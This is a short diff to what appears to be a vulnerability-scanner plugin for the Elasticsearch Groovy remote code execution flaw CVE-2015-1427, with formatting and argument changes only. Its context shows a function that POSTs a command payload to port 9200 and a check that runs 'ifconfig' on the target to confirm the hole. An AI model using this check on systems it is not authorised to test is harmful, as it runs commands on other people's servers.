@@ -28,7 +28,7 @@ def execute(ip, command):
         agent = 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'
         url = "http://%s:9200/_search?pretty" % ip
         conn = httplib.HTTPConnection(ip, port=9200, timeout=10)
-        headers ={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": agent}
+        headers = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": agent}
         conn.request(method='POST', url=url, body=data, headers=headers)
         resp = conn.getresponse()
         code = resp.status
@@ -50,4 +50,4 @@ def do_check(self, url):
     ip = self.host.split(':')[0]
     if execute(ip, 'ifconfig'):
         save_user_script_result(self, '', 'http://%s:9200/_search?pretty' % ip,
-                                'ElasticSearch Groovy remote code exec CVE-2015-1427')
+                                '', 'ElasticSearch Groovy remote code exec CVE-2015-1427')
